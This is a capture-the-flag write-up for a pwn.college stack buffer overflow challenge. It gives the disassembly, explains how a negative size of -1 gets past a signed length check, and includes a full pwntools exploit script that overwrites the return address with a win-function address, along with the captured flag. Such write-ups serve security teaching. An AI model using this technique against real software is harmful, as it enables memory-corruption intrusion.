# level4.1
## Description
Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
## Solution
- The challenge file's name is `babymem-level-4-1`. Running `objdump -d -M intel babymem-level-4-1` inside `/challenge` and looking at the `challenge` function:
```
000000000040180b <challenge>:
  40180b:       f3 0f 1e fa             endbr64
  40180f:       55                      push   rbp
  401810:       48 89 e5                mov    rbp,rsp
  401813:       48 83 ec 70             sub    rsp,0x70
  401817:       89 7d ac                mov    DWORD PTR [rbp-0x54],edi
  40181a:       48 89 75 a0             mov    QWORD PTR [rbp-0x60],rsi
  40181e:       48 89 55 98             mov    QWORD PTR [rbp-0x68],rdx
  401822:       48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40],0x0
  401829:       00 
  40182a:       48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
  401831:       00 
  401832:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  401839:       00 
  40183a:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  401841:       00 
  401842:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  401849:       00 
  40184a:       c7 45 e8 00 00 00 00    mov    DWORD PTR [rbp-0x18],0x0
  401851:       66 c7 45 ec 00 00       mov    WORD PTR [rbp-0x14],0x0
  401857:       48 8d 45 c0             lea    rax,[rbp-0x40]
  40185b:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  40185f:       c7 45 bc 00 00 00 00    mov    DWORD PTR [rbp-0x44],0x0
  401866:       48 8d 3d 9f 08 00 00    lea    rdi,[rip+0x89f]        # 40210c <_IO_stdin_used+0x10c>
  40186d:       b8 00 00 00 00          mov    eax,0x0
  401872:       e8 b9 f8 ff ff          call   401130 <printf@plt>
  401877:       48 8d 45 bc             lea    rax,[rbp-0x44]
  40187b:       48 89 c6                mov    rsi,rax
  40187e:       48 8d 3d 96 08 00 00    lea    rdi,[rip+0x896]        # 40211b <_IO_stdin_used+0x11b>
  401885:       b8 00 00 00 00          mov    eax,0x0
  40188a:       e8 f1 f8 ff ff          call   401180 <__isoc99_scanf@plt>
  40188f:       8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
  401892:       83 f8 2e                cmp    eax,0x2e
  401895:       7e 16                   jle    4018ad <challenge+0xa2>
  401897:       48 8d 3d 80 08 00 00    lea    rdi,[rip+0x880]        # 40211e <_IO_stdin_used+0x11e>
  40189e:       e8 6d f8 ff ff          call   401110 <puts@plt>
  4018a3:       bf 01 00 00 00          mov    edi,0x1
  4018a8:       e8 e3 f8 ff ff          call   401190 <exit@plt>
  4018ad:       8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
  4018b0:       89 c6                   mov    esi,eax
  4018b2:       48 8d 3d 87 08 00 00    lea    rdi,[rip+0x887]        # 402140 <_IO_stdin_used+0x140>
  4018b9:       b8 00 00 00 00          mov    eax,0x0
  4018be:       e8 6d f8 ff ff          call   401130 <printf@plt>
  4018c3:       8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
  4018c6:       89 c2                   mov    edx,eax
  4018c8:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4018cc:       48 89 c6                mov    rsi,rax
  4018cf:       bf 00 00 00 00          mov    edi,0x0
  4018d4:       e8 77 f8 ff ff          call   401150 <read@plt>
  4018d9:       89 45 f4                mov    DWORD PTR [rbp-0xc],eax
  4018dc:       83 7d f4 00             cmp    DWORD PTR [rbp-0xc],0x0
  4018e0:       79 2c                   jns    40190e <challenge+0x103>
  4018e2:       e8 19 f8 ff ff          call   401100 <__errno_location@plt>
  4018e7:       8b 00                   mov    eax,DWORD PTR [rax]
  4018e9:       89 c7                   mov    edi,eax
  4018eb:       e8 b0 f8 ff ff          call   4011a0 <strerror@plt>
  4018f0:       48 89 c6                mov    rsi,rax
  4018f3:       48 8d 3d 6e 08 00 00    lea    rdi,[rip+0x86e]        # 402168 <_IO_stdin_used+0x168>
  4018fa:       b8 00 00 00 00          mov    eax,0x0
  4018ff:       e8 2c f8 ff ff          call   401130 <printf@plt>
  401904:       bf 01 00 00 00          mov    edi,0x1
  401909:       e8 82 f8 ff ff          call   401190 <exit@plt>
  40190e:       48 8d 3d 77 08 00 00    lea    rdi,[rip+0x877]        # 40218c <_IO_stdin_used+0x18c>
  401915:       e8 f6 f7 ff ff          call   401110 <puts@plt>
  40191a:       b8 00 00 00 00          mov    eax,0x0
  40191f:       c9                      leave
  401920:       c3                      ret
```
- We see that the buffer starts from [rbp-0x40]. This means that there are 64 bytes between the buffer and the saved base pointer.
- Similar to [level4.0](./level4.0.md), passing a payload of 80 bytes (where the last 8 bytes are the address of the win function) will overwrite the return address with the address of the win function and get the flag.
- From the disassembly, I noted that the win function is at `0x0000000000401704`.
- We need to keep in mind to pass the number of payload bytes as `-1` to bypass the check at these lines:
```
  40188a:       e8 f1 f8 ff ff          call   401180 <__isoc99_scanf@plt>
  40188f:       8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
  401892:       83 f8 2e                cmp    eax,0x2e
  401895:       7e 16                   jle    4018ad <challenge+0xa2>
  401897:       48 8d 3d 80 08 00 00    lea    rdi,[rip+0x880]        # 40211e <_IO_stdin_used+0x11e>
```
- I wrote a python script to generate the payload:
```python
import pwn

padding = b'A' * 72
payload = padding + pwn.p64(0x0000000000401704)

r = pwn.process('/challenge/babymem-level-4-1')
r.recvuntil('size:')
r.sendline('-1')

r.recvuntil('bytes)!')
r.send(payload)
print(r.readall())
```
- Running the script will give us the flag: `pwn.college{MVKwM5nqbldQrYIwSmke3QUYZlG.0lN5IDL5QTO0czW}`.